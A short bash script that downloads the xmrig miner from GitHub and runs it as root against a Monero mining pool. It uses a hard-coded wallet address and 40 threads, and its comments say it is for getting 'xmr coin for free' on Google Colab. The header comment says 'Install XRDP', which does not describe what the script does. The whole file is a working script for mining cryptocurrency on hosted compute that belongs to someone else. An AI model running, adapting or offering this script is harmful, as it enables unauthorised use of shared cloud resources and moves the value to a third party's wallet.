#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
sudo ./xmrig -o us-west.minexmr.com:4444 -u 47Ca9o1NHxSciy1QcNFYndVhPXcMjuMRCY3wVMZyTeLDLCZTxnqZj9WUccJbfahXDBPkqmzX7jUzFCGvNj5NBCBsRLQWX9G -k --rig-id GC-US -t 40 --randomx-1gb-pages
